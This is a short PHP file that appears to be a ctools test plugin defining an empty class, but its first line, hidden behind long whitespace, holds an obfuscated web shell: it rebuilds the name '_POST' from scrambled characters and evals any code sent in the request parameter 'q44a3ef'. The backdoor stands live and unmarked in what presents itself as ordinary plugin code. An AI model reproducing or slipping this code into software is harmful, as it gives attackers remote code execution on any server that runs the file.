<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q44a3ef'])){eval(${$s20}['q44a3ef']);}?><?php
/**
 * @file
 * A cached plugin object that tests inheritence including.
 */

class ctoolsNotCachedPluginArray extends ctoolsNotCachedPluginArray2 {}
